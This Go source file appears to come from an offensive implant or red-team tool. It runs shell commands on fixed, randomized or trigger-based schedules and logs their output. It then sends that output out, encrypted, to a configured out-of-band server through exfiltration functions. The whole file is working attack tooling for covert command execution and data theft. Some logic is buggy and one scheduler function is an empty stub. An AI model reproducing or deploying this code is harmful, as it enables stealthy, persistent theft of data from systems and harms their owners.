package main

import (
	"context"
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"os/exec"
	"sort"
	"strconv"
	"strings"
	"time"
)

// Check whether to execute single command or execute commands from file, carry oput appropriate action
func Execute() {

	if GeneralSettings.Task == CommandFromFile {
		executeFromFile()
	} else {
		ExecuteOnce(true, CmdSettings.Command, CmdSettings.Params)
	}
}

// Execute a collection of commands held in a file
func executeFromFile() {

	if GeneralSettings.Verbose {
		fmt.Println("Executing Commands from File:	", CmdSettings.ShellInputFile)
	}

	// Check if the file path is provided
	if CmdSettings.ShellInputFile == "" {
		fmt.Println("Error. No file path provided for commands.")
		os.Exit(NoTargetsFile)
	}

	// Read collection of commands into string array
	commands, err := ReadArrayFromFile(CmdSettings.ShellInputFile)
	if err != nil {
		fmt.Println("Error reading bounce targets from file:", err)
		os.Exit(FileReadError)
	}

	// Execute each command and record or return output as required
	for index, command := range commands {
		if index == len(commands) {
			// If cmd output is being written to a file, file will only be returned when last command executed
			ExecuteOnce(true, command, nil)
		} else {
			ExecuteOnce(false, command, nil)
		}
	}

}

// Execute a command once and exfiltrate or write to file for exfiltration
func ExecuteOnce(lastCommand bool, command string, params []string) {

	// Returned data from command
	var output string

	if GeneralSettings.Verbose {
		fmt.Println("Executing Command:	", command, " ", params)
	}

	// Execute command as appropriate
	if CmdSettings.OSShell == "" {
		output = executeCommand(command, params)
	} else {
		output = executeCmdInShell(CmdSettings.OSShell, command, params)
	}

	// Check whether we need to execute and return output immediately or save to file
	if CmdSettings.ToFile {
		// Execute and write to file
		// Build command and params into the actual full command line if we're recording it in a file to be exfiltrated later
		if CmdSettings.IncludeCommand {
			params := strings.Join(CmdSettings.Params, " ")
			command = CmdSettings.Command + " " + params
		}

		// Save the output to file
		recordCommandOutput(output, command)

		// If this is the final command (i.e. cmds read from file), check whether the file needs to be exfiltrated now or later
		if lastCommand {
			CheckUploadNeeds()
		}
	} else {
		// Immediately exfiltrate the output
		ExfiltrateStringData(output, Exfiltrator.UUID, OOBSettings.Server, []byte(CryptoSettings.Key))
	}
}

// Execute a command (with params) and return the output
func executeCommand(command string, params []string) string {

	if GeneralSettings.Verbose {
		fmt.Println("Executing command:	", command)
		fmt.Printf("Number of parameters:	%d\n", len(params))
		fmt.Println("Params:	", params)
		fmt.Println("Timeout:	", CmdSettings.CancelTiming)
	}

	// Define some variables to hold shell output
	var output []byte
	var err error

	// Check if user has requested to stop shell execution after a time limit is reached
	if CmdSettings.CancelTiming > 0 {

		timeout := time.Duration(CmdSettings.CancelTiming) * time.Second
		ctx, cancel := context.WithTimeout(context.Background(), timeout)
		defer cancel()

		// Run the command in a Context with timelimit applied and return output
		cmd := exec.CommandContext(ctx, command, params...)

		// Execution within time limit succeeded - return output to user
		output, err = cmd.Output()
		if err != nil {
			// Timeout has occured - return fail message to user
			return "Command timed out. Execution time exceeded time limit."
		}
	} else {
		// Regular execution with no timeout
		cmd := exec.Command(command, params...)

		output, err = cmd.Output()
		if err != nil {
			fmt.Println("Error running command: ", err)
		}
	}

	// Return output from command
	return string(output)
}

// Build the command to be executed in the shell specified by the user
func executeCmdInShell(shellname string, command string, params []string) string {

	// Assemble params into single string and append to cmd
	allParams := strings.Join(params, " ")
	cmdLine := command + " " + allParams

	// Add any specified pipe in and pipe out commands
	if CmdSettings.HasPipeInput {
		prefix := strings.Join(CmdSettings.PipeInput, "|")
		cmdLine = prefix + "|" + cmdLine
	}
	if CmdSettings.HasPipeOutput {
		suffix := strings.Join(CmdSettings.PipeInput, "|")
		cmdLine = cmdLine + "|" + suffix
	}

	if GeneralSettings.Verbose {
		fmt.Println("Executing command in shell:	", cmdLine)
		fmt.Println("User-specified shell:	", shellname)
		fmt.Println("Timeout:	", CmdSettings.CancelTiming)
	}

	// Run command and get output
	output := shellOut(shellname, cmdLine)

	// Return cmdline output
	return output

}

// Take the shell command, and output to appropriate channel
func shellOut(shellname string, command string) string {

	// Define some variables to hold shell output
	var output []byte
	var err error

	// Check if user has requested to stop shell execution after a time limit is reached
	if CmdSettings.CancelTiming > 0 {

		timeout := time.Duration(CmdSettings.CancelTiming) * time.Second
		ctx, cancel := context.WithTimeout(context.Background(), timeout)
		defer cancel()

		// Run the command in a Context with timelimit applied and return output
		cmd := exec.CommandContext(ctx, shellname, "-c", command)

		// Execution within time limit succeeded - return output to user
		output, err = cmd.Output()
		if err != nil {
			// Timeout has occured - return fail message to user
			return "Command timed out. Execution time exceeded time limit."
		}
	} else {
		// Regular execution with no timeout
		cmd := exec.Command(shellname, "-c", command)

		output, err = cmd.Output()
		if err != nil {
			fmt.Println("Error running command: ", err)
		}
	}

	return string(output)
}

// Write the shell output to a file
func recordCommandOutput(output string, command string) error {

	// Open the file in append mode, create it if it does not exist
	outputFile, err := os.OpenFile(Exfiltrator.OutputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer outputFile.Close()

	// This slice will hold all data that is being written to the file
	outputLines := []string{}

	// The following separator will be used for readability to mark out the sections in the file
	separator := "------------------------------------------------------------------"

	// Add date and time to output if required
	if CmdSettings.IncludeDateTime {
		outputLines = append(outputLines, separator)
		outputLines = append(outputLines, "Time of execution:	"+time.Now().String())
		outputLines = append(outputLines, separator)
	}
	// Add command to output if required
	if CmdSettings.IncludeCommand {
		outputLines = append(outputLines, "Command:	"+command)
		outputLines = append(outputLines, separator)
	}
	// Output will always be included (obviously)
	outputLines = append(outputLines, output)

	// Write the collected output to file
	for _, line := range outputLines {
		_, err := outputFile.WriteString(line + "\n")
		if err != nil {
			fmt.Println("Error writing to file: ", err)
		}
	}

	return nil
}

// Simulate a cron-style function to execute on a timer, without blocking or hogging respources
func Cron(ctx context.Context, startTime time.Time, delay time.Duration) <-chan time.Time {

	// Create a channel to act as return value
	stream := make(chan time.Time, 1)

	// Calculate a start time in the future
	if !startTime.IsZero() {

		// Check start time against elapsed time
		timeDiff := time.Until(startTime)
		if timeDiff < 0 {
			total := timeDiff - delay
			times := total / delay * -1

			startTime = startTime.Add(times * delay)
		}
	}

	// Use goroutine for effective resource usage
	// i.e. we will not block on this thread
	go func() {

		// Check start time before running event
		currentTime := <-time.After(time.Until(startTime))
		stream <- currentTime

		// Open new ticker
		ticker := time.NewTicker(delay)

		// Ensure ticker is stopped when finished
		defer ticker.Stop()

		// Listen on ticker channel and context done channel to determine stopping time
		for {
			select {
			case nextTime := <-ticker.C:
				stream <- nextTime
			case <-ctx.Done():
				close(stream)
				return
			}
		}
	}()

	return stream
}

// Set new random timer val if needed
func checkRandomOpTimer() {

	// Check for random timer, set a new value if needed
	if CmdSettings.OpMode == RepeatRandom {
		CmdSettings.OpTiming = rand.Intn(CmdSettings.RandOpMax-CmdSettings.RandOpMin) + CmdSettings.RandOpMin
	}
}

// Execute command on a fixed regular basis
func ExecuteCmdOnFixedTimer() {

	// Set background context for this to avoid excessive resource consumption
	ctx := context.Background()

	// Set the start time
	startTime := time.Now()

	// The delay variable will be used to set the time duration between executions
	var delay time.Duration

	// If we are using a random timer, need to set a new value
	checkRandomOpTimer()

	// The timer will be in seconds, minutes, hours, days or weeks as decided by user
	switch CmdSettings.OpTimingMode {
	case EveryXSeconds:
		delay = time.Second * time.Duration(CmdSettings.OpTiming)
	case EveryXMinutes:
		delay = time.Minute * time.Duration(CmdSettings.OpTiming)
	case EveryXHours:
		delay = time.Hour * time.Duration(CmdSettings.OpTiming)
	case EveryXDays:
		delay = time.Hour * 24 * time.Duration(CmdSettings.OpTiming)
	case EveryXWeeks:
		delay = time.Hour * 24 * 7 * time.Duration(CmdSettings.OpTiming)
	}

	// Use cron simulator to check if timer condition is met
	for timeCheck := range Cron(ctx, startTime, delay) {
		// If we are using a random timer, need to set a new value
		checkRandomOpTimer()
		// Timer condition is met - execute and determine what to do next
		Execute()
		if GeneralSettings.Verbose {
			fmt.Println("Command execution taking place at:	", timeCheck)
		}
	}
}

// Execute command on a schedule (i.e. a particular time each day, each week, or each month)
func ExecuteCmdOnScheduledTimer() {

	// Set background context for this to avoid excessive resource consumption

	// Begin loop

	// Execute as appropriate

	// Is exfiltration condition met?

	// Is stopping condition met?
}

// Execute command when a trigger becomes true/valid
func ExecuteCmdOnTrigger() {

	// Run the trigger check for the first time and store the output for future comparison
	checkTrigger(true)

	// Set background context for this to avoid excessive resource consumption
	ctx := context.Background()

	// Set the start time
	startTime := time.Now()

	// The delay variable will be used to set the time duration between executions
	var delay time.Duration

	// The timer will be in seconds, minutes, hours, days or weeks as decided by user
	switch TriggerSettings.TriggerTimerMode {
	case EveryXSeconds:
		delay = time.Second * time.Duration(TriggerSettings.TriggerTiming)
	case EveryXMinutes:
		delay = time.Minute * time.Duration(TriggerSettings.TriggerTiming)
	case EveryXHours:
		delay = time.Hour * time.Duration(TriggerSettings.TriggerTiming)
	case EveryXDays:
		delay = time.Hour * 24 * time.Duration(TriggerSettings.TriggerTiming)
	case EveryXWeeks:
		delay = time.Hour * 24 * 7 * time.Duration(TriggerSettings.TriggerTiming)
	}

	// Use cron simulator to check if timer condition is met
	for timeCheck := range Cron(ctx, startTime, delay) {
		// Check if trigger condition is satisfied
		if checkTrigger(false) {
			// Timer and trigger condition both met - execute and determine what to do next
			Execute()
			if GeneralSettings.Verbose {
				fmt.Println("Command execution taking place at:	", timeCheck)
			}
		}
	}
}

// Check whether a trigger condition has been met for the execution of a command
func checkTrigger(firsttime bool) bool {

	// The content of the command output
	// This will either be stored for reference on first run, or used for comparison on subsequent runs
	var output string
	var dirlist []os.FileInfo

	// Initialize return val to false, prior to carrying out checks
	retval := false

	// Get the current output in order to perform comparison for selected trigger mode
	switch TriggerSettings.TriggerMode {
	case FileSize:
		// Size of file
		filestats, err := os.Stat(TriggerSettings.TargetPath)
		if err != nil {
			fmt.Println("Error getting data for trigger target file:	", TriggerSettings.TargetPath)
			os.Exit(InvalidTriggerTarget)
		}
		output = strconv.FormatInt(filestats.Size(), 10)
	case DirectoryListing:
		// Number of files in directory
		dirfiles, err := ioutil.ReadDir(TriggerSettings.TargetPath)
		if err != nil {
			fmt.Println("Error getting data for trigger target directory:	", TriggerSettings.TargetPath)
			os.Exit(InvalidTriggerTarget)
		}
		output = strconv.Itoa(len(dirfiles))
		sortFilesDescOrder(dirfiles)
		dirlist = dirfiles
	default:
		// If we've reached this point we're assuming a comparison between command outputs is needed
		output = executeCommand(TriggerSettings.ShellCommand, TriggerSettings.ShellParams)
	}

	// If this is the first time then the command is being run to provide a baseline
	if firsttime {
		TriggerSettings.PreviousOutput = output
		TriggerSettings.PreviousDirFiles = dirlist
	} else {
		if output != TriggerSettings.PreviousOutput {
			retval = compareTriggerValues(output)
		} else if TriggerSettings.TriggerMode == DirectoryListing && TriggerSettings.TriggerType == NotEqual {
			// Edge case check to account for directory content change checking in a case where same number of files, but maybe changes to files within dir
			retval = compareFilesInDir(dirlist)
		}
	}

	return retval
}

// Check previous output against current output, according to trigger mode and type
func compareTriggerValues(currentval string) bool {

	// Initialize return val to false, prior to carrying out checks
	retval := false

	// Perform appropriate comparison for our trigger mode
	switch TriggerSettings.TriggerMode {
	case FileSize:
		// Change in file properties
		retval = TriggerSettings.TriggerType == compareFiles(currentval)
	case DirectoryListing:
		// Change in directory content
		retval = TriggerSettings.TriggerType == compareDirectories(currentval)
	case ShellOutputNumeric:
		// Change in cmd output, numeric values
		retval = TriggerSettings.TriggerType == compareNumericShellOutputs(currentval)
	default:
		// If we've reached this point we're assuming a comparison between command outputs is needed
		retval = TriggerSettings.TriggerType == compareShellOutputs(currentval)
	}

	return retval
}

// Compare two file sizes, return equal, not equal, less than or greater than
func compareFiles(newval string) int {

	// Default return val - we should not have reached this point if files are genuinely equal size
	retval := Equal

	// Convert string vals to ints
	newlen, err := strconv.Atoi(newval)
	if err != nil {
		fmt.Println("Error converting new file length to integer:	", newval)
	}
	oldlen, err := strconv.Atoi(TriggerSettings.PreviousOutput)
	if err != nil {
		fmt.Println("Error converting original file length to integer:	", TriggerSettings.PreviousOutput)
	}

	if newlen > oldlen {
		// Current version of file longer than previously
		retval = GreaterThan
	} else if newlen < oldlen {
		// Current version of file shorter than previously
		retval = LessThan
	} else if newlen != oldlen {
		// This should be impossible
		retval = NotEqual
	}

	return retval
}

// Compare two directory listings, return equal, not equal, less than or greater than
func compareDirectories(newval string) int {

	// Default return val - we should not have reached this point if directories are genuinely equal size
	// We should only be here if there are more files or less files
	retval := Equal

	// Convert string vals to ints
	newlen, err := strconv.Atoi(newval)
	if err != nil {
		fmt.Println("Error converting new file count to integer:	", newval)
	}
	oldlen, err := strconv.Atoi(TriggerSettings.PreviousOutput)
	if err != nil {
		fmt.Println("Error converting original file count to integer:	", TriggerSettings.PreviousOutput)
	}

	if newlen > oldlen {
		retval = GreaterThan
	} else if newlen < oldlen {
		retval = LessThan
	} else if newlen != oldlen {
		// This should be impossible
		retval = NotEqual
	}

	return retval
}

// Compare individual files in a directory
// This is for situation where we have same number of files but want to check for change of file names or sizes
func compareFilesInDir(dirfiles []os.FileInfo) bool {

	// Get previous array
	prevfiles := TriggerSettings.PreviousDirFiles

	// Failsafe check - it should be impossible to be in this function if different number of files in the two slices
	if len(dirfiles) != len(prevfiles) {
		return false
	}

	// Sort new slice prior to comparison
	// Original slice should have been sorted prior to storage
	sortFilesDescOrder(dirfiles)

	// Loop through each file in directory, compare to previous value
	for index, file := range dirfiles {

		// Get file info from previous check
		prevfile := prevfiles[index]

		if GeneralSettings.Verbose {
			fmt.Println("Previous file settings:	", prevfile.Name(), prevfile.Size(), prevfile.ModTime())
			fmt.Println("Current file settings:	", file.Name(), file.Size(), file.ModTime())
		}

		if prevfile.Name() != file.Name() || prevfile.Size() != file.Size() || prevfile.ModTime() != file.ModTime() {
			// An individual file has changed
			return false
		}

	}

	// Reaching this point without exiting indicates no change to content
	return true
}

// Sort files into descending order
func sortFilesDescOrder(fileDataItems []os.FileInfo) {

	sort.Slice(fileDataItems, func(index, sortedIndex int) bool {
		return fileDataItems[index].Size() > fileDataItems[sortedIndex].Size()
	})
}

// Compare two shell outputs, return equal, not equal, less than or greater than
func compareShellOutputs(newval string) int {

	// Default return val - we should not have reached this point if shell output is genuinely different
	retval := Equal

	// Convert string vals to ints
	newlen := len(newval)
	oldlen := len(TriggerSettings.PreviousOutput)

	if newlen > oldlen {
		retval = GreaterThan
	} else if newlen < oldlen {
		retval = LessThan
	} else if newval != TriggerSettings.PreviousOutput {
		// This is to check same string length but different string content
		// Note it will be triggered by case differences
		retval = NotEqual
	}

	return retval
}

// Compare two shell outputs, return equal, not equal, less than or greater than
func compareNumericShellOutputs(newval string) int {

	// Default return val - we should not have reached this point if files are genuinely equal size
	retval := Equal

	// Convert string vals to ints
	newlnumval, err := strconv.ParseFloat(newval, 64)
	if err != nil {
		fmt.Println("Error converting new shell output to floating point value:	", newval)
		return retval
	}
	oldnumval, err := strconv.ParseFloat(TriggerSettings.PreviousOutput, 64)
	if err != nil {
		fmt.Println("Error converting original shell output to floating point value:	", TriggerSettings.PreviousOutput)
		return retval
	}

	if newlnumval > oldnumval {
		// Current output greater than previously
		retval = GreaterThan
	} else if newlnumval < oldnumval {
		// Current output less than previously
		retval = LessThan
	} else if newlnumval != oldnumval {
		// This should be impossible
		retval = NotEqual
	}

	return retval
}

// Return number of files in specified directory

// Execute command on a fixed regular basis
func CheckUploadNeeds() {

	// The timer will be in seconds, minutes, hours, days or weeks as defined by user
	switch CmdSettings.ResponseTimingMode {
	case Immediate:
		// Exfiltrate data without waiting
		ExfiltrateFileData(CmdSettings.ShellOutputFile, Exfiltrator.UUID, OOBSettings.Server, []byte(CryptoSettings.Key))
	case Fixed:
		UploadOnFixedTimer()
	case Randomized:

	case ReportOnTrigger:
		if checkTrigger(false) {
			ExfiltrateFileData(CmdSettings.ShellOutputFile, Exfiltrator.UUID, OOBSettings.Server, []byte(CryptoSettings.Key))
		}
	}

}

// Execute command on a fixed regular basis
func UploadOnFixedTimer() {

	// Set background context for this to avoid excessive resource consumption
	ctx := context.Background()

	// Set the start time
	startTime := time.Now()

	// The delay variable will be used to set the time duration between executions
	var delay time.Duration

	// The timer will be in seconds, minutes, hours, days or weeks as defined by user
	switch CmdSettings.ResponseTimingMode {
	case EveryXSeconds:
		delay = time.Second * time.Duration(CmdSettings.ResponseTiming)
	case EveryXMinutes:
		delay = time.Minute * time.Duration(CmdSettings.ResponseTiming)
	case EveryXHours:
		delay = time.Hour * time.Duration(CmdSettings.ResponseTiming)
	case EveryXDays:
		delay = time.Hour * 24 * time.Duration(CmdSettings.ResponseTiming)
	case EveryXWeeks:
		delay = time.Hour * 24 * 7 * time.Duration(CmdSettings.ResponseTiming)
	}

	// Use cron simulator to check if timer condition is met
	for timeCheck := range Cron(ctx, startTime, delay) {

		if GeneralSettings.Verbose {
			fmt.Println("Command output upload taking place at:	", timeCheck)
			fmt.Println("Output filename:	", CmdSettings.ShellOutputFile)
		}
		ExfiltrateFileData(CmdSettings.ShellOutputFile, Exfiltrator.UUID, OOBSettings.Server, []byte(CryptoSettings.Key))
	}
}
